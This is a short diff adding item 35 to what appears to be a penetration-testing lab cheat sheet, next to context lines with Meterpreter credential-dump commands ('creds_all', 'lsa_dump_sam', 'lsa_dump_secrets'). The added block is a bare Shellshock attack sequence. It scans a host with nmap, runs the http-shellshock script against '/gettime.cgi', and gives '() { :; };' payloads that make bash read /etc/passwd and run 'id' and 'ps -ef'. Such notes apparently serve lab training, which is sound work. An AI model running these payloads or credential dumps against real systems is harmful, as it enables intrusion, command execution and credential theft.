@@ -647,6 +647,17 @@ creds_all
 lsa_dump_sam
 lsa_dump_secrets
 ```
+35)
+
+```
+ip addr
+nmap 192.242.220.3
+nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3
+open burp suite
+() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+() { :; }; echo; echo; /bin/bash -c 'id'
+() { :; }; echo; echo; /bin/bash -c 'ps -ef'
+```
 
 
 
